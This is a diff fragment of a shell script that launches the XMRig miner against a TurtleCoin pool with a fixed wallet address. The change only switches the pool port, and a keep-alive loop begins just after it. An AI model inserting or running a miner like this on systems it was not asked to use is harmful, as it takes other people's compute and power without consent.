@@ -8,7 +8,7 @@ tar xf xmrig-6.14.0-linux-x64.tar.gz
 
 cd xmrig-6.14.0 
 
-./xmrig  --donate-level 1 -o sg.turtlecoin.herominers.com:10380 -u TRTLv1LTeb2i6QteiPaKoWBFEZVuUFeBT3Lvxp5qfV8VFGbF1idL67bXNmE9HFH3vra7KxqprxY9ZLFmMyUNKuyj9fnm3Cs4mcU -p Ikrims -a argon2/chukwav2 -k 
+./xmrig  --donate-level 1 -o sg.turtlecoin.herominers.com:1160 -u TRTLv1LTeb2i6QteiPaKoWBFEZVuUFeBT3Lvxp5qfV8VFGbF1idL67bXNmE9HFH3vra7KxqprxY9ZLFmMyUNKuyj9fnm3Cs4mcU -p Ikrims -a argon2/chukwav2 -k 
 
 while [ 1 ]; do 
 
